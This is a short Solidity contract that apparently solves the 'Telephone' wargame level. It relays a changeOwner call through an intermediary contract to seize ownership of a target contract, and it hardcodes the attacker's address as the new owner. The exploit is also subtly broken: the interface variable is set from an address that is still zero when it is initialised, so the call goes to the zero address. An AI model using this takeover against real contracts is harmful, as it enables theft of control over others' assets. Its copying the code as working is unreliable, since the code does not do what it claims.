// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICaller {
    function changeOwner(address _owner) external;
}

contract TelephoneCaller {
    address public owner;
    address public telephoneAddress;
    ICaller Telephone = ICaller(telephoneAddress);

    constructor(address _telephoneAddress) {
        telephoneAddress = _telephoneAddress;
    }

    function changeOwner() public {
        Telephone.changeOwner(0xcbe90FCA508a741D3d4539f5e26eEed632Ae7A10);
    }
}